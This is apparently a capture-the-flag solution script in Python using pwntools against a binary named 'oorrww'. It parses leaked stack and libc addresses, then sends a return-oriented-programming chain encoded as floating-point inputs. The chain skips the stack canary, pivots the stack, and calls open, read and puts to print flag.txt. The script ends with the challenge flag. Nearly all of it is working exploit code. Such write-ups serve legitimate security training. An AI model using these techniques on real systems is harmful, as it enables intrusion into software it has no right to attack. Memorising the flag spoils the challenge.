#!/usr/bin/python3
from pwn import *
import struct

gs = '''
b *main+191
continue
'''
elf = context.binary = ELF('./oorrww')
context.terminal = ['tmux', 'splitw', '-hp', '70']
#libc = ELF('./libc.so.6')
libc = elf.libc
def start():
    if args.GDB:
        return gdb.debug('./oorrww', gdbscript=gs)
    if args.REMOTE:
        return remote('193.148.168.30', 7666)
    else:
        return process('./oorrww')
r = start()
#========= exploit here ===================

r.recvuntil(b"here are gifts for you: ")
leaks = r.recvline().strip()[:-1].split(b" ")#removing !

decoded_leaks = [x.decode('utf-8') for x in leaks]
float_leaks = [float(x) for x in decoded_leaks]

int_leaks = []
for f in float_leaks:
    packed = struct.pack('d', f)
    unpacked = struct.unpack('q', packed)[0]
    int_leaks.append(unpacked)
leak1 = int_leaks[0]
leak2 = int_leaks[1]

log.info(f"stack leak {hex(leak1)}")
log.info(f"libc leak {hex(leak2)}")

libc.address = leak2- 0x62090 #libc offset
log.info(f"libc base {hex(libc.address)}")

def hex_to_double_as_bytes(hex_number):
    int_value = int(hex_number, 16)
    packed = struct.pack('Q', int_value)
    double_value = struct.unpack('d', packed)[0]
    double_str = f"{double_value:.16e}".encode('utf-8')
    return double_str

# Gadgets
#0x000000000002a3e5: pop rdi; ret;
#0x000000000002be51: pop rsi; ret;
#0x000000000011f2e7: pop rdx; pop r12; ret;
#0x0000000000091316: syscall; ret;
#0x0000000000029139: ret;
#0x00000000000a00ae: sub rsp, -0x80; mov eax, r12d; pop rbp; pop r12; pop r13; ret;
#0x00000000000d8380 : mov rax, 2 ; ret
#0x0000000000045eb0 : pop rax ; ret
#0x00000000000baaf9 : xor rax, rax ; ret

movrax2 = libc.address + 0x00000000000d8380
poprdi = libc.address + 0x2a3e5
poprsi = libc.address + 0x2be51
syscall = libc.address + 0x0000000000091316
poprdx = libc.address + 0x000000000011f2e7
xorax = libc.address + 0x00000000000baaf9
'''
exploit plan
open(), read(), puts()
'''

#flag.txt
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x7478742e67616c66)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x0))) #wasted quadword stack is filled we need to put a \0

#ropping
#open(flag.txt)
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprdi)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(leak1)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprsi)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(movrax2)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(syscall)))

#read()
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprdi)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x3)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprsi)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(leak1+0x100))) #further on the stack
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprdx)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x50)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(libc.sym.read)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprdi)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(leak1+0x100))) #further on the stack
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(libc.sym.puts)))
r.sendlineafter(b"input:",b"-") #skip canary
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(leak1+8)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(libc.address + 0x0000000000042c2b))) # leave ret to pivot

#========= interactive ====================
r.interactive()
#L3AK{th3_d0ubl3d_1nput_r3turns_whAt_u_wAnt}